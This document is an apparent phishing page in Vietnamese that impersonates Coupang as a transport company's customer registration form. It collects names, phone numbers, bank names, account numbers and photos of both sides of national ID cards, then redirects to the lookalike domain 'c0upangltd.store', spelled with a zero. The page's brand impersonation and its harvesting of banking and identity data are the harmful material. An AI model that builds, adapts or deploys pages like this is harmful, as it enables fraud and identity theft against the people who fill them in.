<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coupang - Đăng ký khách hàng</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f8f9fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            overflow: hidden;
            width: 100%;
            max-width: 480px;
        }

        .header {
            padding: 40px 40px 30px;
            text-align: center;
            background-color: white;
            border-bottom: 1px solid #f0f0f0;
        }

        .logo {
            width: 200px;
            height: auto;
            margin: 0 auto 20px;
            display: block;
        }

        .qr-section {
            text-align: center;
            margin: 20px 0;
            padding: 20px;
            background-color: #f8f9fa;
            border-radius: 8px;
            border: 1px solid #e9ecef;
        }

        .qr-code {
            width: 120px;
            height: 120px;
            margin: 0 auto 10px;
            border: 2px solid #ddd;
            border-radius: 8px;
            background-image: url('https://i.ibb.co/KjpNCVY8/QR.jpg');
            background-size: cover;
            background-position: center;
        }

        .qr-text {
            font-size: 12px;
            color: #666;
            margin-bottom: 5px;
        }

        .qr-instruction {
            font-size: 11px;
            color: #999;
        }

        .company-info {
            margin-bottom: 20px;
        }

        .company-name {
            font-size: 18px;
            font-weight: 600;
            color: #333;
            margin-bottom: 5px;
        }

        .company-subtitle {
            font-size: 14px;
            color: #666;
        }

        .content {
            padding: 30px 40px 40px;
        }

        .form-title {
            font-size: 20px;
            font-weight: 600;
            color: #333;
            margin-bottom: 25px;
            text-align: center;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-row {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
        }

        .form-group.half {
            flex: 1;
        }

        label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #333;
            margin-bottom: 8px;
        }

        input[type="text"], input[type="tel"] {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
            background-color: #fff;
            transition: all 0.3s;
        }

        input[type="text"]:focus, input[type="tel"]:focus {
            outline: none;
            border-color: #1E90FF;
            box-shadow: 0 0 0 3px rgba(30, 144, 255, 0.1);
        }

        .file-input-wrapper {
            position: relative;
            overflow: hidden;
            display: block;
            width: 100%;
        }

        .file-input-wrapper input[type="file"] {
            position: absolute;
            left: -9999px;
        }

        .file-input-label {
            width: 100%;
            padding: 14px 16px;
            border: 2px dashed #ddd;
            border-radius: 6px;
            background-color: #fafafa;
            cursor: pointer;
            display: block;
            text-align: center;
            font-size: 14px;
            color: #666;
            transition: all 0.3s;
            min-height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .file-input-label:hover {
            border-color: #1E90FF;
            background-color: #f0f8ff;
        }

        .file-input-label.has-file {
            border-style: solid;
            background-color: #e8f4f8;
            color: #333;
        }

        .register-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #1E90FF, #4169E1);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 30px;
            transition: all 0.3s;
            box-shadow: 0 2px 10px rgba(30, 144, 255, 0.3);
        }

        .register-btn:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 15px rgba(30, 144, 255, 0.4);
        }

        .register-btn:active {
            transform: translateY(0);
        }

        .footer {
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: #999;
            background-color: #f8f9fa;
        }

        @media (max-width: 600px) {
            .container {
                margin: 10px;
            }
            
            .header, .content {
                padding-left: 20px;
                padding-right: 20px;
            }
            
            .form-row {
                flex-direction: column;
                gap: 20px;
            }
            
            .logo {
                font-size: 40px;
            }
        }

        .required {
            color: #e74c3c;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://i.ibb.co/YBwY1jpF/logo-coupang-w350.png" alt="Coupang Logo" class="logo">
            
            <div class="company-info">
                <div class="company-name">CÔNG TY VẬN TẢI VIỆT - HÀN</div>
                <div class="company-subtitle">(Công ty TNHH COUPANG)</div>
            </div>

            <div class="qr-section">
                <div class="qr-code"></div>
                <div class="qr-text">Quét mã QR để đăng ký nhanh</div>
                <div class="qr-instruction">Sử dụng ứng dụng Coupang để quét</div>
            </div>
        </div>

        <div class="content">
            <h2 class="form-title">THÔNG TIN KHÁCH HÀNG</h2>
            
            <form id="registrationForm">
                <div class="form-row">
                    <div class="form-group half">
                        <label for="fullName">HỌ VÀ TÊN <span class="required">*</span></label>
                        <input type="text" id="fullName" name="fullName" required>
                    </div>
                    <div class="form-group half">
                        <label for="phone">SỐ ĐIỆN THOẠI <span class="required">*</span></label>
                        <input type="tel" id="phone" name="phone" required>
                    </div>
                </div>

                <div class="form-group">
                    <label for="bankName">TÊN NGÂN HÀNG <span class="required">*</span></label>
                    <input type="text" id="bankName" name="bankName" required>
                </div>

                <div class="form-group">
                    <label for="accountNumber">SỐ TÀI KHOẢN <span class="required">*</span></label>
                    <input type="text" id="accountNumber" name="accountNumber" required>
                </div>

                <div class="form-group">
                    <label for="idFront">HÌNH ẢNH THẺ MẶT TRƯỚC <span class="required">*</span></label>
                    <div class="file-input-wrapper">
                        <input type="file" id="idFront" name="idFront" accept="image/*" required>
                        <label for="idFront" class="file-input-label" id="idFrontLabel">
                            📷 Chọn ảnh mặt trước thẻ căn cước
                        </label>
                    </div>
                </div>

                <div class="form-group">
                    <label for="idBack">HÌNH ẢNH THẺ MẶT SAU <span class="required">*</span></label>
                    <div class="file-input-wrapper">
                        <input type="file" id="idBack" name="idBack" accept="image/*" required>
                        <label for="idBack" class="file-input-label" id="idBackLabel">
                            📷 Chọn ảnh mặt sau thẻ căn cước
                        </label>
                    </div>
                </div>

                <button type="submit" class="register-btn">
                    ĐĂNG KÝ NGAY
                </button>
            </form>
        </div>

        <div class="footer">
            ©Coupang Corp. All rights reserved.
        </div>
    </div>

    <script>
        // Handle file input display
        document.getElementById('idFront').addEventListener('change', function(e) {
            const label = document.getElementById('idFrontLabel');
            const fileName = e.target.files[0] ? e.target.files[0].name : '📷 Chọn ảnh mặt trước thẻ căn cước';
            label.textContent = e.target.files[0] ? `✓ ${fileName}` : '📷 Chọn ảnh mặt trước thẻ căn cước';
            label.classList.toggle('has-file', e.target.files[0]);
        });

        document.getElementById('idBack').addEventListener('change', function(e) {
            const label = document.getElementById('idBackLabel');
            const fileName = e.target.files[0] ? e.target.files[0].name : '📷 Chọn ảnh mặt sau thẻ căn cước';
            label.textContent = e.target.files[0] ? `✓ ${fileName}` : '📷 Chọn ảnh mặt sau thẻ căn cước';
            label.classList.toggle('has-file', e.target.files[0]);
        });

        // Handle form submission
        document.getElementById('registrationForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Collect form data
            const formData = {
                fullName: document.getElementById('fullName').value.trim(),
                phone: document.getElementById('phone').value.trim(),
                bankName: document.getElementById('bankName').value.trim(),
                accountNumber: document.getElementById('accountNumber').value.trim(),
                idFront: document.getElementById('idFront').files[0],
                idBack: document.getElementById('idBack').files[0]
            };

            // Validation
            if (!formData.fullName || !formData.phone || !formData.bankName || !formData.accountNumber) {
                alert('⚠️ Vui lòng điền đầy đủ thông tin bắt buộc!');
                return;
            }

            if (!formData.idFront || !formData.idBack) {
                alert('⚠️ Vui lòng tải lên ảnh mặt trước và mặt sau thẻ căn cước!');
                return;
            }

            // Show loading state
            const submitBtn = document.querySelector('.register-btn');
            const originalText = submitBtn.textContent;
            submitBtn.textContent = '⏳ Đang xử lý...';
            submitBtn.disabled = true;

            // Simulate processing time then redirect
            setTimeout(() => {
                window.open('https://c0upangltd.store', '_blank');
                
                // Reset button
                submitBtn.textContent = originalText;
                submitBtn.disabled = false;
            }, 1500);
        });

        // Phone number formatting
        document.getElementById('phone').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 0) {
                if (value.length <= 3) {
                    value = value;
                } else if (value.length <= 6) {
                    value = value.slice(0, 3) + ' ' + value.slice(3);
                } else if (value.length <= 10) {
                    value = value.slice(0, 3) + ' ' + value.slice(3, 6) + ' ' + value.slice(6);
                } else {
                    value = value.slice(0, 3) + ' ' + value.slice(3, 7) + ' ' + value.slice(7, 11);
                }
            }
            e.target.value = value;
        });
    </script>
</body>
</html>